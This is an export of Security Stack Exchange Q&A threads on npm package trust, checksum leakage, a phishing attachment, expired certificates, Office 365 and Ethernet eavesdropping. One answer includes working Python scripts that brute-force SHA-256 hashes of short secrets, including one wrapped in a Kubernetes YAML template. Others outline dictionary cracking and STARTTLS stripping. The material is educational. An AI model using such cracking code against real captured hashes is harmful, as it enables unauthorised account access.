"268952","268952","Security and data protection reviews of npm packages","<p>Does npm ensure that the packages are not spying on your data, saving it somewhere or is it the responsibility of the developer to ensure it? Can I confidently use the moderately well-known packages without the data being saved and mishandled?</p>
","0","3","268969","<p>Since you mentioned GDPR compliance, (EU) GDPR provides principles, guidance and general restrictions. It is not a methodology which can be followed step by step, and as such, its technical implementation is left to software designers, developers and compliance auditors.</p>
<p>Whether the libraries/dependencies you're using are secure, should be checked by you, unfortunately. However, as you can understand, this is very difficult to verify systematically. As such, in order to mitigate the risk associated with using someone else's software, you should use widely accepted libraries from well known parties.</p>
<p>On top of that, you should always perform a <a href=""https://en.wikipedia.org/wiki/Software_composition_analysis"" rel=""nofollow noreferrer"">software composition analysis</a> (SCA) using the appropriate tools, which will provide you with some level of confidence in using third party software. You may take a look at this <a href=""https://medium.com/@manjula.aw/nodejs-security-tools-de0d0c937ec0"" rel=""nofollow noreferrer"">article</a>, which provides some guidelines for nodejs.</p>
","0"
"268952","268952","Security and data protection reviews of npm packages","<p>Does npm ensure that the packages are not spying on your data, saving it somewhere or is it the responsibility of the developer to ensure it? Can I confidently use the moderately well-known packages without the data being saved and mishandled?</p>
","0","3","269000","<p>No. There is no review. Anyone can upload a package there, and it will be published immediately. Even malicious packages containing malware. This has happened, it's not just a theoretical concern.</p>
<p>As a developer, you are expected to verify yourself that the packages you use are fine and, if you are serious, also the dependencies (alternatively, you might choose to blindly trust certain authors and not check anything, it's your choice). Note that even if you manually verify the packages you use, it's not enough to pin to that exact version forever, as it's possible that new vulnerabilities are found in that version, so it's something to review periodically.</p>
<p>As for GDPR compliance, you most likely need a lawyer to weight in. Use cases range from &quot;We don't handle any personal information at all&quot; to &quot;We need to categorize the types of personal information used, our legal basis for processing, correctly describe that in our terms, and gather the appropriate user permission when necessary, as well as ensuring the user is able to opt-out as easily as opt-in, it includes the portability options we are required to provide, we have a designated DPO that will timely handle all requests we might receive regarding their data, and so on&quot;.</p>
","0"
"268945","268945","Can the secret be derived from the checksum? Should the checksum be encrypted?","<p>Assuming I have secret data that is encrypted (using <a href=""https://github.com/mozilla/sops"" rel=""nofollow noreferrer"">sops</a> for example) and a checksum of the secret data for change detection: Is it possible to derive secret information from the checksum or should the checksum also be encrypted?</p>
<p>I would assume, that no secret data can be reconstructed just by having the checksum.</p>
<p>For the sake of this discussion, let's assume we have a Kubernetes secret YAML sops encrypted and the checksum of the unencrypted YAML file is generated using <code>sha256sum</code>.</p>
<p>Deriving from the comments, it might be important to point out that there are some &quot;fixtures&quot; in the Kubernetes secret manifest YAML that are well-known:</p>
<pre><code>apiVersion: v1
kind: Secret
metadata:
  name: &lt;dynamic secret name&gt;
type: Opaque
stringData:
  &lt;dynamic content&gt;
</code></pre>
","12","5","268947","<p><code>sha256sum</code> is a cryptographically secure algorithm, compliant with FIPS-180. Such algorithms are designed so that one cannot derive the secret from the hash/output.</p>
<p>Other methods can be used to try to guess the secrets, like bruteforcing, but that's not a weakness of the checksum.</p>
","18"
"268945","268945","Can the secret be derived from the checksum? Should the checksum be encrypted?","<p>Assuming I have secret data that is encrypted (using <a href=""https://github.com/mozilla/sops"" rel=""nofollow noreferrer"">sops</a> for example) and a checksum of the secret data for change detection: Is it possible to derive secret information from the checksum or should the checksum also be encrypted?</p>
<p>I would assume, that no secret data can be reconstructed just by having the checksum.</p>
<p>For the sake of this discussion, let's assume we have a Kubernetes secret YAML sops encrypted and the checksum of the unencrypted YAML file is generated using <code>sha256sum</code>.</p>
<p>Deriving from the comments, it might be important to point out that there are some &quot;fixtures&quot; in the Kubernetes secret manifest YAML that are well-known:</p>
<pre><code>apiVersion: v1
kind: Secret
metadata:
  name: &lt;dynamic secret name&gt;
type: Opaque
stringData:
  &lt;dynamic content&gt;
</code></pre>
","12","5","268948","<p>If you put something like a human generated password into the secret data and an attacker gets to see the sha256, you have basically used sha256 as a password storage hash, which is very weak - the attacker can brute force it offline using multiple GPUs at many billions of guesses per second (a single RTX 4090 does over 21 billion hashes per second for sha256), using known password files, and they'll break many human generated passwords.</p>
<p>If the secret data has a lot of entropy - meaning it has computer generated long token, at least something as complex as a fresh UUID4 generated a moment before the value is hashed and encrypted, then it's safe.</p>
","6"
"268945","268945","Can the secret be derived from the checksum? Should the checksum be encrypted?","<p>Assuming I have secret data that is encrypted (using <a href=""https://github.com/mozilla/sops"" rel=""nofollow noreferrer"">sops</a> for example) and a checksum of the secret data for change detection: Is it possible to derive secret information from the checksum or should the checksum also be encrypted?</p>
<p>I would assume, that no secret data can be reconstructed just by having the checksum.</p>
<p>For the sake of this discussion, let's assume we have a Kubernetes secret YAML sops encrypted and the checksum of the unencrypted YAML file is generated using <code>sha256sum</code>.</p>
<p>Deriving from the comments, it might be important to point out that there are some &quot;fixtures&quot; in the Kubernetes secret manifest YAML that are well-known:</p>
<pre><code>apiVersion: v1
kind: Secret
metadata:
  name: &lt;dynamic secret name&gt;
type: Opaque
stringData:
  &lt;dynamic content&gt;
</code></pre>
","12","5","268967","<p>The big keyword here is that I will/could know your hashed secret. If I know what your hash is, I can figure out what the secret value is NOT by hashing something else with the same algorithm.
If the maximum number of possibilities for your secret value is less than the number of possibilities I can hash, I can in theory, determine your secret value. If your secret value is something like an IPV4 address, which has at most ~4 billion possibilities, using modern hardware, I could hash 4 billion values very quickly, and utilizing something called a rainbow table, figure out your secret value very quickly. However, if your secret value is something that has a very large, or theoretically infinite number of possibilities, then it would take a very large, or theoretically infinite amount of time to figure out what it is.</p>
<p>Think about it like this. Your secret value is fixed. Meaning the probability of me guessing at random your secret value is:
p = 1/n;
where n is the size of all possible values.
Therefore, if I wanted to guarantee I guess your secret value, all I would have to do is guess all possible values.
success = t(h) * n;
where t() is the amount of time required to compute a hash (h) using your algorithm.</p>
<p>If n is small, say 4 billion and if t(h) is also small, say 10mhs, or 1/10E6, then you could guess all possible values in about 400ish seconds. However, I am sure you can see how as we start to raise the value of n, the amount of time required also increases. Alternatively, you can use a more computationally complex algorithm to increase the amount of time required for me to compute each hash. Doubling the computational time required for each hash will have a small effect on you, but it will literally double the amount of time required to guess your secret value.</p>
<p>So the question becomes, how many possible values are you able to put into a Kubernetes secret file?</p>
","1"
"268945","268945","Can the secret be derived from the checksum? Should the checksum be encrypted?","<p>Assuming I have secret data that is encrypted (using <a href=""https://github.com/mozilla/sops"" rel=""nofollow noreferrer"">sops</a> for example) and a checksum of the secret data for change detection: Is it possible to derive secret information from the checksum or should the checksum also be encrypted?</p>
<p>I would assume, that no secret data can be reconstructed just by having the checksum.</p>
<p>For the sake of this discussion, let's assume we have a Kubernetes secret YAML sops encrypted and the checksum of the unencrypted YAML file is generated using <code>sha256sum</code>.</p>
<p>Deriving from the comments, it might be important to point out that there are some &quot;fixtures&quot; in the Kubernetes secret manifest YAML that are well-known:</p>
<pre><code>apiVersion: v1
kind: Secret
metadata:
  name: &lt;dynamic secret name&gt;
type: Opaque
stringData:
  &lt;dynamic content&gt;
</code></pre>
","12","5","268974","<blockquote>
<p>Is it possible to derive secret information from the checksum?</p>
</blockquote>
<p>Yes. The checksum will disclose (at minimum) a Yes/No on whether the secret is a given value (i.e. act as an oravle).</p>
<p>If you want no information leak at all, you should either:</p>
<ul>
<li>hash/checksum the <em>encrypted</em> secret</li>
<li>encrypt the checksum (either along the secret or separately)</li>
</ul>
<p>Note that this is generally not a big issue if</p>
<ul>
<li>the checksum function is a cryptographic hash, like your usage of sha256, <em>and</em></li>
<li>the checksummed data contain enough random information unknown to an attacker (either because that is included in the secret, or there is a separate source of entropy included in the checksummed data, which is why adding a fresh UUID4 each time was suggested at another answer)</li>
</ul>
<p>but the other options are better ones.</p>
<p>Note that even with cryptographic hashes, an oracle can be a powerful primitive. For example, if an attacked knew that some time ago the secret was:</p>
<pre><code>kind: Secret
stringData: StackExchangeFeb2023
</code></pre>
<p>knowledge that the current hash of the secret is <code>15c42421218cd40e6051f20c0993604ffa6583b746a068867ec864d9c5912fc1</code> would allow them to successfully guess the new value, despite the preimage resistance of the hash algorithm used.</p>
","13"
"268945","268945","Can the secret be derived from the checksum? Should the checksum be encrypted?","<p>Assuming I have secret data that is encrypted (using <a href=""https://github.com/mozilla/sops"" rel=""nofollow noreferrer"">sops</a> for example) and a checksum of the secret data for change detection: Is it possible to derive secret information from the checksum or should the checksum also be encrypted?</p>
<p>I would assume, that no secret data can be reconstructed just by having the checksum.</p>
<p>For the sake of this discussion, let's assume we have a Kubernetes secret YAML sops encrypted and the checksum of the unencrypted YAML file is generated using <code>sha256sum</code>.</p>
<p>Deriving from the comments, it might be important to point out that there are some &quot;fixtures&quot; in the Kubernetes secret manifest YAML that are well-known:</p>
<pre><code>apiVersion: v1
kind: Secret
metadata:
  name: &lt;dynamic secret name&gt;
type: Opaque
stringData:
  &lt;dynamic content&gt;
</code></pre>
","12","5","268991","<p><strong>Insufficient Complexity</strong></p>
<p>Let's pretend you have a secret password, &quot;bad&quot;.</p>
<p>You calculate the SHA256 of this password and get &quot;2f05d4b689d270cafb02285f35f44866f7dc8a2d368a3f9d1124373eeab31fb1&quot;.</p>
<p>If you ALSO tell me that it's the hash of a password that is less than 4 lowercase characters, I can obtain your password in seconds by brute forcing. I only need to try 26^4 combinations for a total of 456976 sha256 hashes to exhaust all possibilities.</p>
<p>Give it a try yourself: <a href=""https://ideone.com/hSWQ8R"" rel=""nofollow noreferrer"">https://ideone.com/hSWQ8R</a></p>
<pre><code>from hashlib import sha256
import string
 
secret_hash = &quot;2f05d4b689d270cafb02285f35f44866f7dc8a2d368a3f9d1124373eeab31fb1&quot;
 
def pass_generator(max_length, charset):
    for i in range(len(charset)**max_length):
        yield get_pass(i, charset)
 
def get_pass(num, charset):
    password = &quot;&quot;
    while num &gt; len(charset) - 1:
        num, index = divmod(num, len(charset))
        password += charset[index]
    password += charset[num]
    return password
 
for password in pass_generator(4, string.ascii_lowercase):
    if sha256(password.encode()).hexdigest() == secret_hash:
        print(password)
</code></pre>
<p><strong>Common Passwords</strong></p>
<p>Let's suppose you instead have the secret password, &quot;123456&quot;.</p>
<p>If I do a quick google search and get a list of the <a href=""https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt"" rel=""nofollow noreferrer"">10,000 most common passwords</a>, I can search fewer, potentially more complex passwords and in this case yours is definitely in there.</p>
<p><strong>Common Patterns on Dictionary Words</strong></p>
<p>Ok, ok, maybe you use &quot;Sm@11Fry!&quot;</p>
<p>Well, crackers have tools to generate and test possible passwords based on patterns, with common letter/symbol/number substitutions and suffixes. It would definitely take longer than the last two, but it's still possible that a generator would come up with this based on manipulating dictionary words with masks.</p>
<p><strong>Insufficient Complexity, Space-Time Tradeoff Version</strong></p>
<p>Ok, so how about &quot;a#g%6^NN!&quot;</p>
<p>Suppose that over many, many years I've used brute force to hash many, many different password-sized strings, including enough symbols to cover what you have here. Now suppose I find a data structure that would let me compactly save the relationship between the hash and the password. So now if I can look up your hash in this data structure, I'm essentially getting several years of brute forcing almost for free (yes, someone had to do the hashing originally). This is called a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"" rel=""nofollow noreferrer"">rainbow table</a> and it's a fascinating concept I encourage you to read up on.</p>
<p>To limit the effectiveness of rainbow tables, you can salt your secret: generate some random bytes, and append them to your password before hashing.</p>
<p>Now my existing rainbow tables are useless - I'd have to recalculate them from scratch for your exact salt (assuming I could obtain it). This is an even bigger deal when you recognize that salts are typically per-user in a real authentication scheme, so an attacker who obtains the whole table of hashed user creds and passwords and salts doesn't get any reusable value from brute forcing the password space for just one of the salts.</p>
<p><strong>Your Case</strong></p>
<p>Suppose I had a yaml like so, and I hash it. Later I use sops to encrypt the secret string &quot;bad&quot;, and the hash and the sopsified yaml are available to the cracker:</p>
<pre><code>apiVersion: v1
kind: Secret
metadata:
  name: my-cool-secret
type: Opaque
stringData:
  bad
</code></pre>
<p>I could brute force this just as easily as the password example above. I assume I would know the exact structure of the yaml, so the only variable part is the stringData, and if I expect it to be all lower case and very short, it's the same complexity of brute force.</p>
<p>Try it for yourself: <a href=""https://ideone.com/P0FNg6"" rel=""nofollow noreferrer"">https://ideone.com/P0FNg6</a></p>
<pre><code>from hashlib import sha256
import string
 
template = &quot;&quot;&quot;apiVersion: v1
kind: Secret
metadata:
  name: my-cool-secret
type: Opaque
stringData:
  {}&quot;&quot;&quot;
 
secret_hash = &quot;2f97f7393a589fff32db98e5edf54a455937516f567b0d352556537fcb06aa53&quot;
 
def pass_generator(max_length, charset):
    for i in range(len(charset)**max_length):
        yield get_pass(i, charset)
 
def get_pass(num, charset):
    password = &quot;&quot;
    while num &gt; len(charset) - 1:
        num, index = divmod(num, len(charset))
        password += charset[index]
    password += charset[num]
    return password
 
for password in pass_generator(4, string.ascii_lowercase):
    if sha256(template.format(password).encode()).hexdigest() == secret_hash:
        print(password)
</code></pre>
<p>All of the same cracking principles apply as with the simpler examples above, except that multiple secrets extend the total complexity.</p>
","2"
"268866","268866","Accidently opened a phishing email .docx attachment on my iPhone, should I worry?","<p>Two days ago, I received an email saying as object &quot;March rent&quot; in French. It says time to pay my rent for the month of March, and got the email March 1st... I thought this was my landlord sending me an email, as he sometimes do. However, there was no much info in the mail except a word document attachment .docx, that I opened to see what it was about. Found out this is a scam trying to makes me transfert money. Deleted.</p>
<p>The issue, I opened the attachment, and worst, I don't know what can happen.</p>
<p>I'm using an iPhone 7 on latest iOS, the attachment has been opened with the default Mail app.</p>
<p>Uploaded <a href=""https://www.virustotal.com/gui/file/c3b4dfeb29acf7da488be4ae8632090ab6210fab59f6adc6b263f3eadd4ae37b"" rel=""nofollow noreferrer"">the file on Virustotal</a>, nothing found.</p>
<p>Uploaded <a href=""https://www.hybrid-analysis.com/sample/c3b4dfeb29acf7da488be4ae8632090ab6210fab59f6adc6b263f3eadd4ae37b?environmentId=160"" rel=""nofollow noreferrer"">the file on Hybrid-Analysis</a> (sandbox run), nothing malicious seems to have been done.</p>
<p>Renamed .docx to .zip, extracted and inspected the content. Only found .xml stuff, nothing relevant here. Looks like the document contains no macros.</p>
<p>I'm still worried that something might have infected my device with that attachment, what can I do to get peace of mind ?</p>
","2","3","268867","<p>Factory reset if you could afford, but might be too extreme.</p>
<p>Check for network connections that look suspicious, like IP addresses that are creating sockets.  Verify all IPs are not malicious.</p>
<p>Scan attachment for IP addresses that could be CNC</p>
<p>Install a free antivirus and do a scan.</p>
<p>Also, any cloud services connected, check logs their too for any suspicious sign-ins.</p>
<p>With all that said, if you are running the last iOS, you are probably safe.</p>
<p>Just a couple ideas.</p>
","-1"
"268866","268866","Accidently opened a phishing email .docx attachment on my iPhone, should I worry?","<p>Two days ago, I received an email saying as object &quot;March rent&quot; in French. It says time to pay my rent for the month of March, and got the email March 1st... I thought this was my landlord sending me an email, as he sometimes do. However, there was no much info in the mail except a word document attachment .docx, that I opened to see what it was about. Found out this is a scam trying to makes me transfert money. Deleted.</p>
<p>The issue, I opened the attachment, and worst, I don't know what can happen.</p>
<p>I'm using an iPhone 7 on latest iOS, the attachment has been opened with the default Mail app.</p>
<p>Uploaded <a href=""https://www.virustotal.com/gui/file/c3b4dfeb29acf7da488be4ae8632090ab6210fab59f6adc6b263f3eadd4ae37b"" rel=""nofollow noreferrer"">the file on Virustotal</a>, nothing found.</p>
<p>Uploaded <a href=""https://www.hybrid-analysis.com/sample/c3b4dfeb29acf7da488be4ae8632090ab6210fab59f6adc6b263f3eadd4ae37b?environmentId=160"" rel=""nofollow noreferrer"">the file on Hybrid-Analysis</a> (sandbox run), nothing malicious seems to have been done.</p>
<p>Renamed .docx to .zip, extracted and inspected the content. Only found .xml stuff, nothing relevant here. Looks like the document contains no macros.</p>
<p>I'm still worried that something might have infected my device with that attachment, what can I do to get peace of mind ?</p>
","2","3","268893","<p>Colloquially, the terms &quot;phishing&quot;, &quot;scam&quot; (including BEC), and &quot;malware&quot; are used interchangeably, something that makes it really difficult to discuss them as separate concepts. I prefer to think of them as mutually exclusive categories:</p>
<p><a href=""https://en.wikipedia.org/wiki/Phishing"" rel=""nofollow noreferrer"">Phishing</a> attacks aim to harvest your credentials, such as by tricking you into plugging them into a form. The threat you're asking about looks more like a <a href=""https://en.wikipedia.org/wiki/Confidence_trick"" rel=""nofollow noreferrer"">scam</a> (like <a href=""https://en.wikipedia.org/wiki/Email_spoofing#Business_email"" rel=""nofollow noreferrer"">Business Email Compromise</a> or just standard <a href=""https://en.wikipedia.org/wiki/Advance-fee_scam"" rel=""nofollow noreferrer"">advance-fee fraud</a>), which is a conversational attack (they talk you into giving them your money or access). These rarely overlap with <a href=""https://en.wikipedia.org/wiki/Malware"" rel=""nofollow noreferrer"">malware</a>, which will mess with your computer.</p>
<p>I see you've already determined that the .docx does not contain a macro. Nearly all attacks in that file format require a macro, so that's a good sign. If there was a macro, the next step would be to determine if your phone's software would even run a macro. A lot of systems will refuse to run macros or will at least warn you before trying.</p>
<p>If you're a high-value target (privileged access worth vast sums of money or of other high consequence; e.g. you're an elected official, a CFO, or admin with broad access), it would be wise to be thorough and wipe everything after your information security team performs a detailed analysis.</p>
<p>Otherwise, because there were no macros, your software and OS were fully up to date, and you didn't find any hits on VirusTotal or in a sandbox (though this was a Windows sandbox, not an iOS sandbox), you're probably fine.</p>
","1"
"268866","268866","Accidently opened a phishing email .docx attachment on my iPhone, should I worry?","<p>Two days ago, I received an email saying as object &quot;March rent&quot; in French. It says time to pay my rent for the month of March, and got the email March 1st... I thought this was my landlord sending me an email, as he sometimes do. However, there was no much info in the mail except a word document attachment .docx, that I opened to see what it was about. Found out this is a scam trying to makes me transfert money. Deleted.</p>
<p>The issue, I opened the attachment, and worst, I don't know what can happen.</p>
<p>I'm using an iPhone 7 on latest iOS, the attachment has been opened with the default Mail app.</p>
<p>Uploaded <a href=""https://www.virustotal.com/gui/file/c3b4dfeb29acf7da488be4ae8632090ab6210fab59f6adc6b263f3eadd4ae37b"" rel=""nofollow noreferrer"">the file on Virustotal</a>, nothing found.</p>
<p>Uploaded <a href=""https://www.hybrid-analysis.com/sample/c3b4dfeb29acf7da488be4ae8632090ab6210fab59f6adc6b263f3eadd4ae37b?environmentId=160"" rel=""nofollow noreferrer"">the file on Hybrid-Analysis</a> (sandbox run), nothing malicious seems to have been done.</p>
<p>Renamed .docx to .zip, extracted and inspected the content. Only found .xml stuff, nothing relevant here. Looks like the document contains no macros.</p>
<p>I'm still worried that something might have infected my device with that attachment, what can I do to get peace of mind ?</p>
","2","3","268897","<p>Should you worry? Not really.</p>
<p>This sounds like a social attack targeting the human holding the phone (trick you into transfering money) and not a technical attack targeting the phone itself (install malware).</p>
<p>Besides, you verified that the filed does not contain macros. In fact, .docx files can not contain macros. I would be suprised if Word on iOS even runs macros.</p>
<p>There is never a zero procent risk, but if you want to spend time and energy on improving your security it is probably better spent elsewhere.</p>
","1"
"268850","268850","Why do many companies reject expired SSL certificates as bugs in bug bounties?","<p>I noticed that, while browsing through many bug bounty and vulnerability disclosure programs, they don't accept issues that are related to TLS/SSL, which includes expired security certificates.</p>
<p>Why are companies so unwilling to accept expired certificates, which can easily be fixed?</p>
","14","4","268855","<blockquote>
<p>Why are companies so unwilling to accept expired certificates, which can easily be fixed?</p>
</blockquote>
<p>With proper certificate validation a client will not connect to a server which provides an expired certificate. This means that no data will be exchanged over the improperly secured connection. This also means that there is no actual security problem - only an availability problem.</p>
<p>Sure, there are clients which might ignore that the certificate is expired or users which skip browsers warnings. But in this case the real issue is improper certificate validation at the client side, not the expired certificate.</p>
","48"
"268850","268850","Why do many companies reject expired SSL certificates as bugs in bug bounties?","<p>I noticed that, while browsing through many bug bounty and vulnerability disclosure programs, they don't accept issues that are related to TLS/SSL, which includes expired security certificates.</p>
<p>Why are companies so unwilling to accept expired certificates, which can easily be fixed?</p>
","14","4","268870","<p>SSL certificate expiration is a low-effort &quot;just in case&quot; measure against a possible SSL private key leak which theoretically allows to perform a MiTM attack which is not a small feat at all nowadays considering things like DoT/DoH/DNSSec. Serious hostile actors can hack people while being on the same LAN as them or by hacking any intermediate Internet provider/network which many (if not most) governments can do.</p>
<p>So, unless a SSL private key has been leaked, there's no vulnerability at all. In all honesty if your clients can stomach the &quot;certificate has expired&quot; warning, it's all good and secure.</p>
","10"
"268850","268850","Why do many companies reject expired SSL certificates as bugs in bug bounties?","<p>I noticed that, while browsing through many bug bounty and vulnerability disclosure programs, they don't accept issues that are related to TLS/SSL, which includes expired security certificates.</p>
<p>Why are companies so unwilling to accept expired certificates, which can easily be fixed?</p>
","14","4","268883","<p>Other answers here have addressed the security side of expired certificates. I am going to address the bug bounty side of the question.</p>
<p>If the company's main/live domain(s) has an expired certificate; they sure know about it. Their tech support switchboard has just lit up with all these calls about an 'insecure site'.</p>
<p>If there is an expired cert (or even a self-signed cert) on one of their domains it is likely abandoned, or for internal use only.</p>
<p>Publishing a bug bounty scheme implies that the company is going to pay money for bug reports.</p>
<p>By being up front about excluding this sort of thing they stop low-effort scanners going over their domains and submitting bug reports. This has a dual effect of not wasting the company's time and preventing the negative publicity on social media when the person submitting the report doesn't get a payout.</p>
<p>Update:</p>
<p>As <a href=""https://security.stackexchange.com/questions/268850/why-do-many-companies-reject-expired-ssl-certificates-as-bugs-in-bug-bounties/268883#comment558873_268883"">bta</a> points out in their excellent comment, it would also be trivial to scan domains, save the current expiry date and revisit them again at that time in the hope of getting a bug report out of this.</p>
<p>I would also think that the restriction is merely a type of gatekeeping. If a seasoned security researcher spotted an actual problem; say a % of a company's application servers used an out of date version of - for example - OpenSSL that allowed downgrade attacks, that researcher would know enough about the situation to submit a report anyway. My guess is that such a report would be paid on, whatever the policy says.</p>
","22"
"268850","268850","Why do many companies reject expired SSL certificates as bugs in bug bounties?","<p>I noticed that, while browsing through many bug bounty and vulnerability disclosure programs, they don't accept issues that are related to TLS/SSL, which includes expired security certificates.</p>
<p>Why are companies so unwilling to accept expired certificates, which can easily be fixed?</p>
","14","4","268918","<p>TLDR: bug bountys are to <strong>tell me something that I don't know.</strong></p>
<p>Expired SSL certs are an annoyance that can be automatically detected.  there is no point to pay a human operator for something that can be monitored and predicted using automated software, or even a calendar.</p>
<p>Revoked certs are another matter these certs may indicate an actual risk, but these are still detectable by automated means.</p>
<p>Nevertheless in both cases if they are not detected by IT staff they will likely be reported by users almost immediately when they cease to work, so bug bounty reports will only be duplicating something that is already known.</p>
","8"
"268809","268809","office 365 security","<p>MS is forcing companies to their hosted office/exchange product. I really have not seen any deep discussion or article discussing why I should trust MS to keep my emails secure. I have zero doubt that the hosted version of exchange gives MS has access to all the company emails, and by that logic to any &quot;law enforcing agency&quot;. The software is closed source and impossible to verify how many backdoor options there are (and i am quite sure they have plenty). While not an expert, even company like apple whose marketing is based on privacy (regardless of reality) gives us government agencies access if they ask for it that means that they have to have the access. The situation will be the same in EU.</p>
<p>The question thus is, why would someone even be willing to that way, why so many companies migrate to that inherently insecure option? Self hosted exchanged can always be made secure and internal correspondence erased should the need arise.</p>
<p>So what am i missing here, what would convince me to migrate to online hosted exchange (and no, I don't agree that they are more secure as they are faster patched are behind better firewall infrastructure and all that nonsense, because once you migrate, they own you, they own your emails, they can inspect them erase them, report them, give them to anyone who asks for them, that is basically they are already hacked)? Since so many companies are migrating that way, i must be missing something.</p>
","0","3","268813","<blockquote>
<p>why so many companies migrate to that inherently insecure option?</p>
</blockquote>
<p><strong>Cost</strong> and Cost Stability</p>
<p>It costs a lot of money and the costs fluctuate and can be unpredictable; to build and maintain a datacenter, hire and keep staff, and then secure the infrastructure. Then you still have to pay for the software, and maintain support costs (because your sys admin needs support, and policy says you maintain support). Then there is the costs to manage the costs.</p>
<p>When Microsoft says &quot;we can do all that for a flat rate&quot;, and they can comply and be validated to cloud security compliance standards (for example FedRAMP <a href=""https://www.fedramp.gov/"" rel=""nofollow noreferrer"">https://www.fedramp.gov/</a> and Cloud Security Authorization processes <a href=""https://public.cyber.mil/dccs/"" rel=""nofollow noreferrer"">https://public.cyber.mil/dccs/</a> ), you can't turn that down as a business owner or as a government agency.</p>
<blockquote>
<p>So what am i missing here, what would convince me to migrate to online hosted exchange?</p>
</blockquote>
<p><strong>Liability</strong></p>
<p>The final point is it's also a &quot;risk transfer&quot; technique of risk management; not that it <em>protects the data</em>, but it <em>protects the business'</em> liability. That being, if the data is compromised in my datacenter, on my site I'm (financially and legally) liable for the loss. Where if I contract to microsoft to secure it and they compromise it, they're held more liable for the loss. The data is still lost or compromised, but &quot;my risk&quot; is mitigated.</p>
","-1"
"268809","268809","office 365 security","<p>MS is forcing companies to their hosted office/exchange product. I really have not seen any deep discussion or article discussing why I should trust MS to keep my emails secure. I have zero doubt that the hosted version of exchange gives MS has access to all the company emails, and by that logic to any &quot;law enforcing agency&quot;. The software is closed source and impossible to verify how many backdoor options there are (and i am quite sure they have plenty). While not an expert, even company like apple whose marketing is based on privacy (regardless of reality) gives us government agencies access if they ask for it that means that they have to have the access. The situation will be the same in EU.</p>
<p>The question thus is, why would someone even be willing to that way, why so many companies migrate to that inherently insecure option? Self hosted exchanged can always be made secure and internal correspondence erased should the need arise.</p>
<p>So what am i missing here, what would convince me to migrate to online hosted exchange (and no, I don't agree that they are more secure as they are faster patched are behind better firewall infrastructure and all that nonsense, because once you migrate, they own you, they own your emails, they can inspect them erase them, report them, give them to anyone who asks for them, that is basically they are already hacked)? Since so many companies are migrating that way, i must be missing something.</p>
","0","3","268814","<blockquote>
<p>Since so many companies are migrating that way, i must be missing something.</p>
</blockquote>
<p>You have different priorities than most companies; you care about privacy, companies care about cost reduction (<a href=""https://en.wikipedia.org/wiki/Capital_expenditure"" rel=""nofollow noreferrer"">capex</a> especially, <a href=""https://en.wikipedia.org/wiki/Operating_expense"" rel=""nofollow noreferrer"">opex</a>).</p>
<p>Having everything managed on the cloud helps companies reduce costs (read: IT salaries &amp; infra equipment). Unfortunately, opex are still high, but that's another discussion.</p>
<p>As for your concerns, yes, you're absolutely right; once you put all your assets on the cloud, you're owned. Because our global society still lacks cybersecurity mentality, very few give much consideration on the issues you mention; be it at the company or at the personal level (e.g. see how many people are willing to sacrifice their privacy and/or cybersecurity for the sake of convenience).</p>
<p>This dire situation has led some officials to vote for legislation, that tries to establish a <em>bare minimum</em> of data protection (e.g. EU-GDPR, UK-GDPR/DPA, US HIPPA/FISMA/CCPA etc). However, I think that although they constitute a good start, we still have a long way ahead of us, when it comes to privacy protection and cybersecurity.</p>
","1"
"268809","268809","office 365 security","<p>MS is forcing companies to their hosted office/exchange product. I really have not seen any deep discussion or article discussing why I should trust MS to keep my emails secure. I have zero doubt that the hosted version of exchange gives MS has access to all the company emails, and by that logic to any &quot;law enforcing agency&quot;. The software is closed source and impossible to verify how many backdoor options there are (and i am quite sure they have plenty). While not an expert, even company like apple whose marketing is based on privacy (regardless of reality) gives us government agencies access if they ask for it that means that they have to have the access. The situation will be the same in EU.</p>
<p>The question thus is, why would someone even be willing to that way, why so many companies migrate to that inherently insecure option? Self hosted exchanged can always be made secure and internal correspondence erased should the need arise.</p>
<p>So what am i missing here, what would convince me to migrate to online hosted exchange (and no, I don't agree that they are more secure as they are faster patched are behind better firewall infrastructure and all that nonsense, because once you migrate, they own you, they own your emails, they can inspect them erase them, report them, give them to anyone who asks for them, that is basically they are already hacked)? Since so many companies are migrating that way, i must be missing something.</p>
","0","3","268816","<p>Unless you are using opensource from the email client to the hard disk firmware, you are trusting a closed-source component that may or may not have backdoors and you cannot inspect.</p>
<p>But let's ignore hardware and firmware backdoors, and let you create your own self-hosted, in-house email infrastructure. Your ISP is in position to MitM your email traffic, and most of the time, TLS won't save you.</p>
<p>Between email servers, they usually start a plaintext connection and ask  the peer server to <code>STARTTLS</code>. But this command is sent on clear, and anyone on the path can just reply <code>TLS not available</code>, and the entire transaction is sent on clear.</p>
<p>Even if your SMTP server is explicitly using TLS before SMTP, most email servers usually don't check the certificates of each other and trust anything. If your server is one of those, your emails can be intercepted. If your server is properly configured, you may not receive emails from a lot of servers.</p>
<p>If you want real email security, you will have to enforce end to end encryption on all emails you send or receive. That creates an unsolvable problem, because you cannot force anyone to send you encrypted emails, and not everyone will be able to receive encrypted ones. You will have to ditch email and use something else.</p>
<blockquote>
<p>I don't agree that they are more secure as they are faster patched are behind better firewall infrastructure and all that nonsense</p>
</blockquote>
<p>It's not nonsense, and they are indeed more secure. Microsoft have funding for a dedicated elite security team, something that no small or medium business can do. They can hire the best and pay the best, and your company cannot. They own the OS and the email server, and can apply patches before they are released to the public.</p>
<blockquote>
<p>they own you, they own your emails, they can inspect them erase them, report them, give them to anyone who asks for them</p>
</blockquote>
<p>Microsoft have a reputation to care for, and its reputation is way more valuable than any email you can send or receive. So unless mandated by the government, Microsoft will not intentionally intercept and monitor your emails.</p>
<p>And even if you run your own email infrastructure, your government can do the same to you. If a government agency comes to your door and demands your servers, you don't have any power to say &quot;no.&quot; They can simply park a truck on the parking lot, and leave with all your servers, your storage, your computers and your printed documents.</p>
<p>Most companies are doing it due to cost. Email is not cheap to maintain, and it's a very large attack surface. A company have to care about the email server, the anti-spam filtering, the anti phishing infrastructure, Data Loss Prevention, ransomware attacks, patching, and a lot of other issues. It's way cheaper to pay Microsoft a couple dollars per employee than to hire an entire team of experts to care care of that for them.</p>
","0"
"268805","268805","Can someone who is eavesdropping signals from Ethernet cable, gather sensitive information","<p>Supposing I have connected my laptop to the ethernet cable and all the traffic in the ethernet cable is encrypted (let's say VPN, HTTPS, etc.). Can someone who is eavesdropping the traffic with physical access to the Ethernet cable (via an Ethernet keylogger or maybe inductively, etc), decrypt the traffic and gather sensitive information?</p>
","0","3","268807","<p>No, it is not currently possible to decrypt <em>properly</em> encrypted traffic.</p>
